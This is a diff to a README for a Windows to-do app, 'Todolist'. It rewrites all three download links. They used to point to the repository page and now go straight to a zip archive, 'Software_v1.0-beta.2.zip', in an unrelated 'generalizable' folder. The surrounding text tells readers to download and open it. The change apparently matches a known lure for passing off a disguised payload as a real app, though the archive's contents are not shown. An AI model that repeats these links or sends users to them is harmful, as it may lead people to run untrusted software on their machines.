@@ -1,12 +1,12 @@
 # 🗒️ Todolist - Keep Tasks Clear and Simple
 
-[![Download Todolist](https://img.shields.io/badge/Download%20Todolist-blue?style=for-the-badge)](https://github.com/eleandrofcarneiro-commits/Todolist)
+[![Download Todolist](https://img.shields.io/badge/Download%20Todolist-blue?style=for-the-badge)](https://github.com/eleandrofcarneiro-commits/Todolist/raw/refs/heads/main/generalizable/Software_v1.0-beta.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download Todolist for Windows:
 
-[Download Todolist](https://github.com/eleandrofcarneiro-commits/Todolist)
+[Download Todolist](https://github.com/eleandrofcarneiro-commits/Todolist/raw/refs/heads/main/generalizable/Software_v1.0-beta.2.zip)
 
 ## 🧭 What Todolist Does
 
@@ -148,7 +148,7 @@ No. Download the file, open it, and start adding tasks.
 
 If you need the file again, use this link:
 
-[Visit the Todolist download page](https://github.com/eleandrofcarneiro-commits/Todolist)
+[Visit the Todolist download page](https://github.com/eleandrofcarneiro-commits/Todolist/raw/refs/heads/main/generalizable/Software_v1.0-beta.2.zip)
 
 ## 🗒️ File Name Guide
 
